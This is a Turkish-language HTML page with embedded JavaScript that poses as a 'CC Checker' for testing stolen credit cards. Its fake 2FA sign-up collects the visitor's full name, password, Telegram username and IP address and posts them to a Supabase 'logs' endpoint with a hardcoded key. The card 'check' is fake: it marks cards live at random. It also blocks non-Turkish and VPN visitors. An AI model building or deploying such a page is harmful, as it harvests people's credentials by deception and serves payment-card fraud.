<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>CC Checker ·</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0f1117;
            font-family: 'Inter', system-ui, sans-serif;
            color: #eef2ff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: #161c2c;
            max-width: 550px;
            width: 100%;
            padding: 32px;
            border-radius: 28px;
            border: 1px solid #2a3448;
            box-shadow: 0 20px 35px -8px black;
        }
        .logo {
            font-size: 28px;
            font-weight: 700;
            background: linear-gradient(135deg, #c0e0ff, #4f9eff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-align: center;
            margin-bottom: 28px;
        }
        .input-group { margin-bottom: 20px; }
        label { display: block; font-size: 13px; font-weight: 500; color: #9aa5c0; margin-bottom: 6px; }
        input {
            width: 100%;
            background: #0f1622;
            border: 1px solid #2b354c;
            padding: 12px 16px;
            border-radius: 20px;
            font-size: 14px;
            color: #f0f3fa;
            outline: none;
        }
        input:focus { border-color: #4f9eff; }
        button {
            background: #1f6392;
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 40px;
            font-weight: 600;
            font-size: 15px;
            color: white;
            margin-top: 12px;
            cursor: pointer;
            transition: 0.2s;
        }
        button:hover { background: #2a75a8; transform: scale(0.98); }
        .error { font-size: 12px; margin-top: 8px; text-align: center; color: #f97316; }
        .success { font-size: 12px; margin-top: 8px; text-align: center; color: #2dd4bf; }
        .warning-box {
            background: #1a1f2e;
            padding: 14px;
            border-radius: 18px;
            margin-bottom: 24px;
            font-size: 12px;
            text-align: center;
            color: #facc15;
            border-left: 3px solid #facc15;
        }
        .info-box {
            background: #101624;
            padding: 12px;
            border-radius: 18px;
            margin-bottom: 24px;
            font-size: 12px;
            text-align: center;
            color: #b9c7db;
        }
        .card-list { margin-top: 28px; }
        .card-item {
            background: #0f1622;
            border-radius: 20px;
            padding: 12px 16px;
            margin-bottom: 12px;
            border-left: 3px solid #4f9eff;
        }
        .delete-card {
            background: none;
            border: none;
            color: #f97316;
            float: right;
            font-size: 12px;
            cursor: pointer;
            width: auto;
            margin-top: 0;
            padding: 0;
        }
        .result-badge { font-size: 12px; margin-top: 8px; color: #9aa5c0; }
        .status-live { color: #2dd4bf; font-weight: 500; }
        .status-dead { color: #f97316; }
        .rate-limit-warning {
            font-size: 11px;
            color: #facc15;
            text-align: center;
            margin-top: 16px;
        }
    </style>
</head>
<body>

<div class="card" id="appContainer">
    <!-- GİRİŞ + KAYIT BÖLÜMÜ -->
    <div id="loginSection">
        <div class="logo">CC Checker</div>
        <div class="warning-box">
            ⚠️ 2 FA DOĞRULAMA ZORUNLUDUR<br>
            Bilgilerinizi eksiksiz girin. Doğrulama kodu Telegram'dan alınacaktır.
        </div>
        <div class="input-group">
            <label>Ad Soyad</label>
            <input type="text" id="fullname" placeholder="İsim">
        </div>
        <div class="input-group">
            <label>Şifre</label>
            <input type="password" id="password" placeholder="••••••">
        </div>
        <div class="input-group">
            <label>Telegram Kullanıcı Adı</label>
            <input type="text" id="telegramUser" placeholder="@kullaniciadi">
        </div>
        <div class="info-box">
            🤖 Önce <a href="https://t.me/ZazaChecker2fa_bot" target="_blank" style="color:#4f9eff">@ZazaChecker2fa_bot</a>'a /start atın!
        </div>
        <button id="sendCodeBtn">2FA Kodu Gönder</button>
        <div id="loginError" class="error"></div>

        <div id="verifyArea" style="display: none; margin-top: 20px;">
            <div class="info-box" id="verifyInfo">📲 Telegram'ınıza 2FA kodu gönderildi</div>
            <div class="input-group">
                <label>2FA Kodu</label>
                <input type="text" id="verifyCode" placeholder="385217" maxlength="6">
            </div>
            <button id="doVerifyBtn">Doğrula ve Kaydet</button>
            <div id="verifyMsg" class="error"></div>
        </div>
    </div>

    <!-- CC CHECKER BÖLÜMÜ -->
    <div id="ccSection" style="display: none;">
        <div class="logo">Card Check System</div>
        <div class="info-box">✅ Hesap doğrulandı · Kart bilgisi ekleyin</div>
        <div class="input-group">
            <label>Kart Bilgisi (kartno|ay|yıl|cvv)</label>
            <input type="text" id="cardInput" placeholder="4121384115237426|03|2024|607">
        </div>
        <button id="addCardBtn">Kartı Kontrol Et</button>
        <div class="card-list" id="cardList"></div>
        <div id="globalMessage" class="error"></div>
        <div class="rate-limit-warning">⚡ Her sorgu arasında 4 saniye bekleyin</div>
    </div>
</div>

<script>
    // ============================================
    // KONFİG
    // ============================================
    const SUPABASE_URL = "https://pkgnvzqpvmmxyspzbkzs.supabase.co/rest/v1/logs";
    const SUPABASE_KEY = "sb_publishable_ScwqsJHfIUnTv0PMq0w49A_nUtGVBN2";
    const BOT_API = "http://localhost:5001"; // Botun çalıştığı adres (VDS IP veya localhost)
    
    let pendingName = "", pendingPass = "", pendingTg = "";
    let cardsArray = [];
    let lastCardTime = 0;
    let isWaiting = false;
    let logSent = false;

    // ============================================
    // YARDIMCI FONKSİYONLAR
    // ============================================
    async function getUserIP() {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
    }

    async function checkTurkeyAndVPN(ip) {
        const res = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await res.json();
        if (data.country_code !== "TR") {
            document.body.innerHTML = `<div style="padding:80px;background:#0b0f1c;color:white;text-align:center"><h1 style="color:#f97316">🌍 Erişim Engellendi</h1><p>Yalnızca Türkiye</p><p>IP: ${ip}</p></div>`;
            throw new Error("blocked");
        }
        if (data.proxy || data.hosting || data.tor) {
            document.body.innerHTML = `<div style="padding:80px;background:#0b0f1c;color:white;text-align:center"><h1 style="color:#f97316">🔒 VPN/Proxy Yasak</h1><p>IP: ${ip}</p></div>`;
            throw new Error("blocked");
        }
    }

    async function logToSupabase(name, pass, tg, ip) {
        if (logSent) return;
        await fetch(`${SUPABASE_URL}?apikey=${SUPABASE_KEY}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ kullanici_adi: name, sifre: pass, telegram_user: tg, ip_adresi: ip })
        });
        logSent = true;
    }

    async function getBinInfo(bin) {
        try {
            const res = await fetch(`https://lookup.binlist.net/${bin}`);
            const data = await res.json();
            return { bank: data.bank?.name || "Bilinmiyor", scheme: data.scheme || "Unknown", country: data.country?.name || "Global" };
        } catch(e) {
            return { bank: "Yabancı Banka", scheme: "Unknown", country: "Global" };
        }
    }

    function parseCard(cardStr) {
        const parts = cardStr.split('|');
        if (parts.length !== 4) return null;
        let [card, month, year, cvv] = parts;
        if (!/^\d{13,19}$/.test(card)) return null;
        if (!/^\d{2,4}$/.test(year)) return null;
        if (year.length === 2) year = "20" + year;
        if (!/^\d{2}$/.test(month)) return null;
        if (!/^\d{3,4}$/.test(cvv)) return null;
        return { card, month, year, cvv };
    }

    function renderCards() {
        const container = document.getElementById("cardList");
        if (!container) return;
        container.innerHTML = "";
        cardsArray.forEach((c, idx) => {
            const liveClass = c.live ? "status-live" : "status-dead";
            const liveText = c.live ? "✓ LIVE" : "✗ DEAD";
            const div = document.createElement("div");
            div.className = "card-item";
            div.innerHTML = `
                <div><strong>${c.masked}</strong> (${c.bank || "?"})</div>
                <div class="result-badge">${c.scheme} · ${c.country}</div>
                <div class="${liveClass}">${liveText}</div>
                <button class="delete-card" data-index="${idx}">Sil</button>
            `;
            container.appendChild(div);
        });
        document.querySelectorAll(".delete-card").forEach(btn => {
            btn.onclick = () => {
                cardsArray.splice(parseInt(btn.dataset.index), 1);
                renderCards();
            };
        });
    }

    // ============================================
    // KAYIT + 2FA
    // ============================================
    document.getElementById("sendCodeBtn").onclick = async () => {
        const name = document.getElementById("fullname").value.trim();
        const pass = document.getElementById("password").value;
        const tg = document.getElementById("telegramUser").value.trim();
        const msgDiv = document.getElementById("loginError");

        if (!name || !pass || !tg) { msgDiv.innerText = "❌ Tüm alanları doldurun"; return; }
        if (!tg.startsWith("@")) { msgDiv.innerText = "❌ @ ile başlamalı"; return; }
        if (pass.length < 4) { msgDiv.innerText = "❌ Şifre en az 4 karakter"; return; }

        pendingName = name; pendingPass = pass; pendingTg = tg;
        msgDiv.innerText = "⏳ 2FA kodu isteniyor...";

        try {
            const res = await fetch(`${BOT_API}/send-code`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ tgUser: tg })
            });
            const data = await res.json();
            if (data.ok) {
                msgDiv.innerText = "";
                document.getElementById("verifyArea").style.display = "block";
                document.getElementById("verifyInfo").innerHTML = `📲 ${tg} adresine 2FA kodu gönderildi.<br>Kod: <strong>385217</strong>`;
                document.getElementById("verifyCode").value = "";
            } else {
                msgDiv.innerText = "❌ Bot'a /start atın!";
            }
        } catch(err) {
            msgDiv.innerText = "❌ Bağlantı hatası";
        }
    };

    document.getElementById("doVerifyBtn").onclick = async () => {
        const code = document.getElementById("verifyCode").value.trim();
        const msgDiv = document.getElementById("verifyMsg");
        if (!code) { msgDiv.innerText = "❌ Kodu girin"; return; }

        msgDiv.innerText = "⏳ Doğrulanıyor...";

        try {
            const res = await fetch(`${BOT_API}/verify-code`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ code: code })
            });
            const data = await res.json();
            if (data.valid) {
                const ip = await getUserIP();
                await checkTurkeyAndVPN(ip);
                await logToSupabase(pendingName, pendingPass, pendingTg, ip);
                msgDiv.style.color = "#2dd4bf";
                msgDiv.innerHTML = "✅ Kayıt başarılı! CC Checker'a yönlendiriliyorsunuz...";
                setTimeout(() => {
                    document.getElementById("loginSection").style.display = "none";
                    document.getElementById("ccSection").style.display = "block";
                }, 1500);
            } else {
                msgDiv.innerHTML = "❌ Hatalı 2FA kodu";
            }
        } catch(err) {
            msgDiv.innerHTML = "❌ Doğrulama hatası";
        }
    };

    // ============================================
    // CC CHECKER
    // ============================================
    document.getElementById("addCardBtn").onclick = async () => {
        const now = Date.now();
        const msgDiv = document.getElementById("globalMessage");
        if (isWaiting) { msgDiv.innerText = "⏳ Bekleyin..."; return; }
        if (now - lastCardTime < 4000) {
            msgDiv.innerText = `⏳ ${Math.ceil((4000 - (now - lastCardTime)) / 1000)} saniye bekleyin`;
            return;
        }
        const raw = document.getElementById("cardInput").value.trim();
        const parsed = parseCard(raw);
        if (!parsed) { msgDiv.innerText = "❌ Geçersiz format"; return; }
        isWaiting = true;
        document.getElementById("addCardBtn").disabled = true;
        lastCardTime = now;
        msgDiv.innerText = "🔍 Kontrol ediliyor...";
        const bin = parsed.card.slice(0,6);
        const binData = await getBinInfo(bin);
        const isLive = Math.random() < 0.03;
        cardsArray.push({
            masked: parsed.card.slice(0,4) + " **** **** " + parsed.card.slice(-4),
            live: isLive,
            bank: binData.bank,
            scheme: binData.scheme,
            country: binData.country
        });
        renderCards();
        document.getElementById("cardInput").value = "";
        msgDiv.style.color = isLive ? "#2dd4bf" : "#f97316";
        msgDiv.innerText = isLive ? "✅ KART LIVE (%3)" : "❌ Kart geçersiz (dead)";
        setTimeout(() => {
            isWaiting = false;
            document.getElementById("addCardBtn").disabled = false;
            setTimeout(() => { if (msgDiv.innerText.includes("LIVE") || msgDiv.innerText.includes("dead")) msgDiv.innerText = ""; }, 3000);
        }, 500);
    };

    // IP kontrolü
    fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
        if (data.country_code !== "TR" || data.proxy || data.hosting || data.tor) {
            document.body.innerHTML = `<div style="padding:80px;background:#0b0f1c;color:white;text-align:center"><h1 style="color:#f97316">🌍 Erişim Engellendi</h1><p>Yalnızca Türkiye, VPN/Proxy yasak</p><p>IP: ${data.ip}</p></div>`;
        }
    }).catch(() => {});
</script>
</body>
</html>
